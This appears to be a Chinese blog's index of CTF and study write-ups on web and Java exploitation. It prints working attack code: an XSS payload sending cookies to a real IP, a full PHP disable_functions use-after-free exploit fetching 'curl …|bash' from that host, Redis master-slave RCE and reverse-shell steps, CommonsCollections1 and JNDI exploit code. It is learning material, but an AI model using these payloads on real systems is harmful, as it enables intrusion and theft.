&quot;type&quot;:&quot;importmap&quot;, &quot;program&quot;:{ &quot;name&quot;:&quot;new program&quot;, &quot;scopes&quot;:{ &quot;/js/&quot;:{ &quot;/js/ast-to-js.mjs&quot;:&quot;/js/eval-code.mjs&quot; } }, &quot;code&quot;:&quot;{\\&quot;code\\&quot;:\\&quot;window.location.href='http://110.42.133.120:9999?flag='+document.cookie\\&quot;,\\&quot;variables\\&quot;:[]}&quot; }} 复现成功 如何调用eval-code.js上面其他部分的原理都挺清晰的，就是这里如何调用有些问题,想要看调用过程还得去debug吧debug失败，所以还是继续读了一下源码，发现在calc中存在evalCode和js的eval也是一个东西，重点关注一下传入参数的方式以及参数 可以发现在cacl计算模块当中使用的方法是这样的，传一个参数名为code，并且为json格式的即可 执行的流程如下：一开始已经经过计算了，后面用再一次导入这个mjs文件，总共是导入两次 /js/eval-code.mjs 在第二次的时候执行了code里面的code参数，劫持成功 小结：这题想要解出来，首先要定位到那个content，一开始再看这个题目的时候，就感觉这里挺奇怪的，不过那两天有其他事情要做，所以就没怎么看了，然后接下来需要理清楚的是：1.可以使用这个importmap类型进行操作，而这个类型是允许导入其他js模块进行动态加载的，由于不能导入其他外部，只能调用内部的，而这个eval-code.mjs，其实翻一下文件就可以发现了2.对这个文件进行调用的方式为:主要是针对文件的源码进行审计。","link":"/2022/04/09/2022plaidctf/"},{"title":"2022vnctf-rce小结","text":"InterestingPHP非预期——bypass_disable&lt;?php highlight_file(__FILE__); @eval($_GET['exp']);?&gt; 测试了一下，可以使用file_put_contents，但是其他的命令执行不了 我们可以查看一下disable_function,但是由于phpinfo()用不了 var_dump(ini_get_all()); 可以发现disable_function过滤了很多东西，应该就是要绕了 既然可以写入文件，先试试一些disable_function实现rce https://github.com/mm0r1/exploits 这里有个思路也很巧妙，学习一下，就是通过发送文件的形式，这样的话，就不用一直使用file_put_contents去写文件命令执行，可以直接在一个页面 但是需要注意发送文件的格式 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Content-Length: 144------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;var_dump(&quot;a&quot;);------WebKitFormBoundaryj28zfvoWVxnHdp29-- 然后将rce的脚本贴过来，但是不能马上用，因为disable_function中过滤了fwrite，需要找替代，使用fputs,使用CVE-2021-4034进行提权 使用一个脚本上传一下，我一直在想如何将文件写入，因为怎么写好像都有问题。 其实可以将他放在服务器上，然后利用curl命令下载过去。又掌握一个新姿势。。。我还在一直用python脚本写，而且穿过去以后，我发现使用那边的gcc也没法编译成功。。。 所以我直接在服务器编译了，然后发送过去 完整命令执行内容 POST /?exp=eval($_POST[1]); HTTP/1.1Host: c9be48e4-3f0c-4ebd-8cc6-ba5f826890d0.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: UM_distinctid=17c6332d1772a3-003cfe433760328-4c3e2679-144000-17c6332d178a88Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Content-Length: 6949------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;pwn('curl http://110.42.133.120/tlife|bash ');function pwn($cmd) { define('LOGGING', false); define('CHUNK_DATA_SIZE', 0x60); define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE); define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50); define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1); define('CMD', $cmd); for($i = 0; $i &lt; 10; $i++) { $groom[] = Pwn::alloc(STRING_SIZE); } stream_filter_register('pwn_filter', 'Pwn'); $fd = fopen('php://memory', 'w'); stream_filter_append($fd,'pwn_filter'); fputs($fd, 'x');}class Helper { public $a, $b, $c; }class Pwn extends php_user_filter { private $abc, $abc_addr; private $helper, $helper_addr, $helper_off; private $uafp, $hfp; public function filter($in, $out, &amp;$consumed, $closing) { if($closing) return; stream_bucket_make_writeable($in); $this-&gt;filtername = Pwn::alloc(STRING_SIZE); fclose($this-&gt;stream); $this-&gt;go(); return PSFS_PASS_ON; } private function go() { $this-&gt;abc = &amp;$this-&gt;filtername; $this-&gt;make_uaf_obj(); $this-&gt;helper = new Helper; $this-&gt;helper-&gt;b = function($x) {}; $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2; $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr); $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE; $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr); $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18; $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE); $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers); $this-&gt;prepare_leaker(); $binary_leak = $this-&gt;read($helper_handlers + 8); $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak); $this-&gt;prepare_cleanup($binary_leak); $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38); $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr); $closure_ce = $this-&gt;read($closure_addr + 0x10); $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce); $basic_funcs = $this-&gt;get_basic_funcs($closure_ce); $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs); $zif_system = $this-&gt;get_system($basic_funcs); $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system); $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2; for($i = 0; $i &lt; 0x138; $i += 8) { $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i)); } $this-&gt;write($fake_closure_off + 0x38, 1, 4); $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68; $this-&gt;write($fake_closure_off + $handler_offset, $zif_system); $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off; $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr); $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr); $this-&gt;cleanup(); ($this-&gt;helper-&gt;b)(CMD); } private function make_uaf_obj() { $this-&gt;uafp = fopen('php://memory', 'w'); fputs($this-&gt;uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE)); for($i = 0; $i &lt; STRING_SIZE; $i++) { fputs($this-&gt;uafp, &quot;\\x00&quot;); } } private function prepare_leaker() { $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8; $this-&gt;write($str_off, 2); $this-&gt;write($str_off + 0x10, 6); $val_off = $this-&gt;helper_off + 0x48; $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8); $this-&gt;write($val_off + 8, 0xA); } private function prepare_cleanup($binary_leak) { $ret_gadget = $binary_leak; do { --$ret_gadget; } while($this-&gt;read($ret_gadget, 1) !== 0xC3); $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget); $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60)); $this-&gt;write(8, $ret_gadget); } private function read($addr, $n = 8) { $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10); $value = strlen($this-&gt;helper-&gt;c); if($n !== 8) { $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; } return $value; } private function write($p, $v, $n = 8) { for($i = 0; $i &lt; $n; $i++) { $this-&gt;abc[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; } } private function get_basic_funcs($addr) { while(true) { // In rare instances the standard module might lie after the addr we're starting // the search from. This will result in a SIGSGV when the search reaches an unmapped page. // In that case, changing the direction of the search should fix the crash. // $addr += 0x10; $addr -= 0x10; if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp; in_array($this-&gt;read($addr + 4, 4), [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) { $module_name_addr = $this-&gt;read($addr + 0x20); $module_name = $this-&gt;read($module_name_addr); if($module_name === 0x647261646e617473) { $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr); return $this-&gt;read($addr + 0x28); } } } } private function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = $this-&gt;read($addr); $f_name = $this-&gt;read($f_entry, 6); if($f_name === 0x6d6574737973) { return $this-&gt;read($addr + 8); } $addr += 0x20; } while($f_entry !== 0); } private function cleanup() { $this-&gt;hfp = fopen('php://memory', 'w'); fputs($this-&gt;hfp, pack('QQ', 0, $this-&gt;abc_addr)); for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) { fputs($this-&gt;hfp, &quot;\\x00&quot;); } } private function str2ptr($p = 0, $n = 8) { $address = 0; for($j = $n - 1; $j &gt;= 0; $j--) { $address &lt;&lt;= 8; $address |= ord($this-&gt;abc[$p + $j]); } return $address; } private function ptr2str($ptr, $n = 8) { $out = ''; for ($i = 0; $i &lt; $n; $i++) { $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; } return $out; } private function log($format, $val = '') { if(LOGGING) { printf(&quot;{$format}\\n&quot;, $val); } } static function alloc($size) { return str_shuffle(str_repeat('A', $size)); }}------WebKitFormBoundaryj28zfvoWVxnHdp29-- 预期解:redis主从复制rce写马进去以后，发现有一份redis的账号密码,那应该就是主从复制加载so文件了，想用插件直接试试，发现端口不是6379.猜测可能没开redis服务 学习一下： 利⽤ get_loaded_extensions() 可以看到PHP加载的插件，从中可以看到题⽬环境中加载了PHP的redis插件 （redis.so），翻找⼀下⽂档可以找到这个插件的Redis类中有 rawCommand() ⽅法可以执⾏redis的命令操作。利用 file_put_contents() 写恶意so文件，接着载入恶意.so文件模块，反弹shell至远程主机 var_dump(get_loaded_extensions()); 可以发现，加载了redis的插件，尝试运行一下开启服务 还需要找到开放的端口来打在redis服务，所以还需要扫描 一下端口 &lt;?phphighlight_file(__FILE__);# Port scanfor($i=0;$i&lt;65535;$i++) { $t=stream_socket_server(&quot;tcp://0.0.0.0:&quot;.$i,$ee,$ee2); if($ee2 === &quot;Address already in use&quot;) { var_dump($i); }} 这里有个小tip：写入文件的时候，转为base64写入就不用管转义的事了 $a=&quot;PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg==&quot;;file_put_contents(&quot;a.php&quot;,base64_decode($a)); 接下来发现的步骤就还是提权了","link":"/2022/02/22/2022vnctf/"},{"title":"SSRF打数据库","text":"SSRF打redis之前学了一下打redis的几种姿势，所以现在来复现一下几个函数学习下： parse_url()#解析 URL，返回其组成部分#要解析的 URL。无效字符将使用 _ 来替换。eg:&lt;?php$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;输出:Array( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor)#注意:parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///...）。 gethostbyname — 返回主机名对应的 IPv4地址。ip2long() — 返回其长整数型的ip 2020网鼎杯SSRF打redis再本题中，他给了一个提示：/Please visit hint.php locally.但是他对我们访问本地做了一个waf，防止我们访问到，所以这个时候我们是需要进行绕过的，绕过本地的姿势有很多 跳转/解析到127.0.0.1：http://127.0.0.1.nip.io/hint.php编码绕过：http://0x7f.0.0.1/hint.php特殊字符绕过http://①②⑦.⓪.⓪.①/hint.phphttp://[0:0:0:0:0:ffff:127.0.0.1]/hint.php#这个在这里可以绕过http://127。0。0。1/flag.phphttp://127.1/flag.phphttp://[::]:80/flag.phphttp://127.0.0.1./flag.php 接下来他给了我们关键的源码，解析一下木九十我们需要post一个文件去性进行执行，但是前面有一个exit()需要我们去绕过，这个绕过的方式我记得是用伪协议进行绕过即可 string(1342) &quot; &lt;?phpif($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ highlight_file(__FILE__);}if(isset($_POST['file'])){ file_put_contents($_POST['file'],&quot;&lt;?php echo 'redispass is root';exit();&quot;.$_POST['file']);} 这里提供了redis的密码，又是一个file_put_contents的函数，那就是ssrf打redis了，试了一下用gopher发送请求却没有回显，所以这里还是考虑一下使用主从复制RCE今天配置了很久，决心一定要好好记录一下首先理解一下什么是主从复制rce 1.分清谁是主谁是从我们要让对面的服务器加载我们服务器上的恶意文件.so，那么我们是主，对面是从2.如何让对面的服务器加载首先需要在服务器放上这两个工具，一个是可以执行命令输出payload的工具，一个是开启服务器的工具3.lhost和rhostrhost即为从，lhost为主，并且这里的lhost为了能让对面的服务器加载，必须要是vps 接下来就梳理一下整体流程:将exp.so移动到这个目录然后先在本地的ssef-redis脚本文件进行修改一下： 对以上三个地方进行修改，修改完以后，即可输出payload，接下来启动redis服务，然后把payload再进行一次urlencode即可开打 如果要反弹shell，就把那个命令改成反弹shell的指令，在服务器上开启监听即可 2021天翼杯——easyeval一开始是一个反序列化绕过wakeup函数的,但是他有过滤，只识别A和B两个类，所以可以在外面再嵌套一层C，改变对象数目，即可绕过 &lt;?phperror_reporting(0);class A{ public $code = &quot;eval(\\$_POST['a']);&quot;; #public $code = 'phpinfo();'; function __call($method,$args){ print(&quot;yes&quot;); echo $this-&gt;code; eval($this-&gt;code); } function __wakeup(){ $this-&gt;code = &quot;&quot;; }}class B{ public $a; function __destruct(){ echo $this-&gt;a-&gt;a(); }}class C{ public $c;}$a=new A();$b=new B();$c=new C();$b-&gt;a=$a;$c-&gt;c=$b;$d=serialize($c);echo $d;echo &quot;\\n&quot;; 然后就去命令执行，但是发现他phpinfo()中disable_function过滤了很多命令执行的函数=-=完全执行不了，但是看到有个配置文件，redis的配置文件，又发现file_get_contents函数没有被过滤，于是去打了一下6379端口，发现可以打通，所以感觉大概率是ssrf打redis思路大概有以下几种: 1.备份crontab反弹shell2.备份文件写马3.主从复制rce4.写无损文件用蚁剑连接，发现tmp目录下可写文件，于是直接把redis的恶意模块exp.so放进去然后利用蚁剑的redis插件直接进行连接数据库，密码在网站根目录下有写 然后就登录 小结今天学习的都是SSRF通过主从复制打redis进行rce的，理解完以后发现也没啥难点–，主要是找到一篇看得懂的教程https://blog.csdn.net/rfrder/article/details/113651337","link":"/2021/09/23/SSRF%E6%89%93redis/"},{"title":"","text":"","link":"/2023/02/14/access%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"},{"title":"EDI内部ctf","text":"##web2常见的命令执行函数已经被过滤了，这里主要寻找可以执行命令的函数 preg_match('/call|system|exec|popen|file|passthru|open|eval|map|include|require|filter|assert|env|preg|ini|read|write|rename|show|sort|func|curl|copy|dir|get|proc|ld/i',$str) 下面使用的是call_user_func_array来执行命令传入的参数为，第一个为所要调用的函数，第二个为执行函数的参数，且必须为数组，这个时候就去翻php文档寻找可以调用的函数即可：发现可以使用这两个函数：但是第一个由于版本的原因，用不了（本地测试7.4.3）可以使用 ?func=array_reduce&amp;args[0][0]=&amp;args[0][1]=;}system('ls');/*&amp;args[1]=create_function&amp;args[2]=No data to reduce?func=array_intersect_uassoc&amp;args[0][system('cat /flag')]=&amp;args[1][0]=&amp;args[3]=assert","link":"/2023/01/08/edictf/"},{"title":"git可视化教程","text":"","link":"/2022/03/17/git%E5%8F%AF%E8%A7%86%E5%8C%96%E6%95%99%E7%A8%8B/"},{"title":"java_CommonCollections1利用","text":"CommonCollections1利用链demo从P神的demo来理解 import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class CommonCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class}, new Object[]{&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;}) }; Transformer transformerChain= new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap=TransformedMap.decorate(innerMap,null,transformerChain); outerMap.put(&quot;test&quot;,&quot;x&quot;); }} 接下来学习一下里面的接口和类 TransformedMapTransformedMap用于对java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。我们通过下面这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map: Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer); 其中，keyTransformer是处理新元素的key的回调，valueTransormer是处理新元素的value的回调。我们所说的回调，并不是传统意义上的回调函数，而是一个实现了Transformer接口的类。 Transformer的作用是：对其集合的元素进行增加，删除或修改时调用transform方法进行特定的修饰变换，而这个transform是我们自己定义的 TransformerTransformer是一个接口，它只有一个待实现的方法： public interface Transformer{ public object transform(object input);} TransformedMap在转换Map的新元素时，就会调用transform方法，这个过程就类似在调用一个“回调函数”，这个回调的参数是原始对象。 ConstantTransformerConstantTransformer是实现了Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回。 public ConstantTransformer(Object constantToReturn){ super(); iConstant=constantToReturn;}public Object transform(Object input){ return iConstant;} 作用是 包装任意一个对象，并且在执行回调时，返回这个对象，方便后续操作。 InvokerTransformerInvokerTransformer是实现了Transformer接口的一个类，这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键。 在实例化这个InvokerTransformer时，需要传入三个参数，第一个参数是待执行的方法名，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。 public InvokerTransformer(String methodName, Class paramTypes, Object[] args){ super(); iMethodName=methodName; iParamTypes=paramTypes; iArgs=args;} 后面的回调transform方法，就是执行了input对象的iMethodName方法。 public Object transform(object input){ if(input == null){ return null; } try{ Class cls=input.getClass(); Method method = cls.getMethod(iMethodName,iParamTypes); return method.invoke(input,iArgs); }catch(NoSuchMethodException ex){ throw new FunctorException(&quot;InvokerTransformer: The method '&quot;+iMethodName+&quot;'on'&quot;+input.getClass() + &quot;'does not exist&quot;); }catch (IllegalAccessException ex){ throw new FunctorException(&quot;InvokerTransformer: The method '&quot; +iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;); } catch (InvocationTargetException ex) { throw new FunctorException(&quot;InvokerTransformer: The method '&quot; +iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, ex); }} ChainedTransformerChainedTransformer的作用是将内部的多个Transformer串在一起，将前一个回调返回的结果，作为后一个回调的参数传入 public ChainedTransformer(Transformer[] transformers){ super(); iTransformers = transformers;}public Object transform(Object object){ for(int i=0; i&lt; iTransformers.length; i ++){ object = iTransformers[i].transform(object); } return object;} 理解demoTransformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class}, new Object[]{&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;}) }; Transformer transformerChain= new ChainedTransformer(transformers); 通过新建一个ChainedTransformer，一开始包含了两个Transformer；第一个是ConstantTransformer，根据前面的学习，他的作用是构造函数的构造函数的时候传入一个对象，并在transform方法的时候将这个对象返回，而invokerTransformer，则是执行Runtime对象的exec，参数是后面的地址。 此时的ransformerChain将内部的多个TransformedMap串接在一起，将其和封装入innerMap，通过在Map中放入一个新元素触发回调 Map innerMap=new HashMap(); Map outerMap=TransformedMap.decorate(innerMap,null,transformerChain); outerMap.put(&quot;test&quot;,&quot;x&quot;); 用TransformedMap编写POC要触发上面CC链，需要在Map中放入一个新元素来实现触发。因此我们需要找到一个链，在反序列化的起点readObject逻辑里有写入操作。 这个类就是sun.reflect.annotation.AnnotationInvocationHandler，其readObject方法中，我们重点关注一下写入部分的代码 Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); 其中memberValues就是反序列化后得到的Map，也是经过了TransormedMap修饰的对象，这里遍历了它的所有元素，并依次设置值，在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，那么就会执行我们上面构造的代码。 由于sun.reflect.annotation.AnnotationInvocationHandler是jdk内部的类，不能直接使用new来实例化，所以需要使用反射来获取到其构造方法，，而这个类的构造函数有两个参数，第一个参数是Annotation类，第二个参数是前面构造的Map。 Class clazz= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor construct= clazz.getDeclaredConstructor(Class.class,Map.class);construc.setAccessible(true);Object obj=construc.newInstance(Retention.class,outerMap); 为什么要使用反射通过使用以下代码，我们可以获得序列化流， ByteArrayOutputStream barr= new ByteArrayOutputStream(); ObjectOutputStream oos= new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); 值得注意的是:待序列化的对象和所有它使用的内部属性对象，必须都实现java.io.Serializable接口，但是最早传给ConstantTransformaer的是Runtime.getRuntime(),Runtime类是没有实现java.io.Serializable接口，所以不允许被序列化。 ​ 因此我们可以通过反射来获取到上下文中的Runtime对象， Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);Runtime r=(Runtime) f.invoke(null);r.exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); 转化为Transformer的写法如下： Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{ String.class, Class.class },new Object[]{&quot;getRuntime&quot;,new Class[0]}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{ Object.class, Object[].class }, new Object[]{null,new Object[0]}), new InvokerTransformer(&quot;exec&quot;,new Class[]{ String.class }, new String[]{ &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; }),}; 这个和前面的区别在于，Runtime.getRuntime()换成了Runtime.class，前者为java.lang.Runtime对象，后者为java.lang.Class对象 exppackage test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.util.HashMap;import java.util.Map;public class CommonCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{ String.class, Class[].class },new Object[]{&quot;getRuntime&quot;,new Class[0]}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{ Object.class, Object[].class }, new Object[]{null,new Object[0]}), new InvokerTransformer(&quot;exec&quot;,new Class[]{ String.class }, new String[]{ &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; }), }; Transformer transformerChain= new ChainedTransformer(transformers); Map innerMap=new HashMap(); innerMap.put(&quot;value&quot;,&quot;x&quot;); Map outerMap=TransformedMap.decorate(innerMap,null,transformerChain); Class clazz=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Retention.class,outerMap); ByteArrayOutputStream barr= new ByteArrayOutputStream(); ObjectOutputStream oos= new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o=(Object) ois.readObject(); }} 小结：总结一下这部分的内容：首先利用的是Ysoserial的hashmap函数，实现反序列化，链条使用的类是commoncollections1中的，其中最重要的就是Transformed，可以调用一个函数，通过一系列操作，即可任意代码执行，但是值得一提的是，调用的类需要具有serialize接口，才能实现序列化。","link":"/2022/04/06/java-CommonCollections1%E5%88%A9%E7%94%A8/"},{"title":"jav-jdbc+二次序列化","text":"##jdbc反序列化","link":"/2023/01/07/java-jdbc+%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"java-jndi注入","text":"#JNDI注入首先在前面大致捋一下基础知识，了解什么是JNDI什么是RMI，然后再讲解利用手法##JNDIJNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。 JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。 简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。 按照我的理解，JNDI就是提供用于针对不同的协议提供不同的查询方式的服务。##JNDI+RMI###RMIRMI是java中的一种协议，类似于http，加了一个rmi头，java就会使用rmi的协议请求方法去请求###JNDI+RMI服务编写实现对象创建接口： package org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface IHello extends Remote { public String sayHello(String name) throws RemoteException;} 实现接口功能： package org.example;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class IHelloImpl extends UnicastRemoteObject implements IHello { protected IHelloImpl() throws RemoteException { super(); } @Override public String sayHello(String name) throws RemoteException { return &quot;Hello &quot; + name; }} 客户端： package org.example;import javax.naming.InitialContext;public class JNDIRMIClient { public static void main(String[] args) throws Exception { //创建上下文对象，并使用lookup函数进行调用查询 InitialContext initialContext = new InitialContext(); IHello iHelloobj = (IHello) initialContext.lookup(&quot;rmi://localhost:1099/hello&quot;); System.out.println(iHelloobj.sayHello(&quot;aa&quot;)); }} 服务端： package org.example;import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.Properties;public class CallService { public static void main(String[] args) throws Exception{ //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;); // 创建初始化环境 Context ctx = new InitialContext(env); // 创建一个rmi映射表 Registry registry = LocateRegistry.createRegistry(1099); // 创建一个对象 IHello hello = new IHelloImpl(); // 将对象绑定到rmi注册表 registry.bind(&quot;hello&quot;, hello);// // jndi的方式获取远程对象// IHello rhello = (IHello) ctx.lookup(&quot;rmi://localhost:1099/hello&quot;);// // 调用远程对象的方法// System.out.println(rhello.sayHello(&quot;axin&quot;)); }} ##JNDI+RMI注入我们首先让服务端重新绑定至恶意类 package org.example;import javax.naming.InitialContext;import javax.naming.Reference;public class JNDIRMiServer { public static void main(String[] args) throws Exception { //创建初始上下文 InitialContext initialContext = new InitialContext();// initialContext.rebind(&quot;rmi://localhost:1099/hello&quot;,new IHelloImpl()); Reference refObj = new Reference(&quot;T&quot;,&quot;T&quot;,&quot;http://localhost:7777/&quot;); initialContext.rebind(&quot;rmi://localhost:1099/hello&quot;,refObj); }} 然后这个T就是我们的恶意类：只需要定义构造函数就行 import java.io.IOException;public class T { public T() throws IOException { Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); }} 此时，我们再访问这个rmi服务的时候，就会触发这个远程类了接下来，我们跟进一下lookup函数调用的过程，看看其是如何调用远程类的，再经过多层lookup函数调用以后，会获取远程访问的类，这个时候就已经获取了我们的恶意类了接下来就会调用loadClass加载这个类加载完以后，使用newInstance实例化这个类，此时构造函数就会被触发了可以发现，JNDI注入的关键点在于，lookup函数的内容可控###高版本在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。那么此时我们就无法像前面一样，可以那么单纯的直接使用lookup函数进行命令执行了此时就会直接抛出异常，导致获取不到远程类那么如何绕过呢？####高版本jdk绕过仔细观察前面rmi流程，可以发现，其实是在namingmanager的地方获取恶意类的，而前面的限制也只是存在于禁止远程访问而已可以发现上面if有三个条件判断 其中第一个判断的r需要不是引用对象，我们从远程对象引用的基本就是引用对象了，这里就不太有操作的空间 而第二个通过函数返回了下面远程地址的值，如果这个是null的话，也会绕过，如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键 第三个就是默认的参数，只能自己配置所以我们只需要找到一个本地的factory，触发至这个namingmanager即可 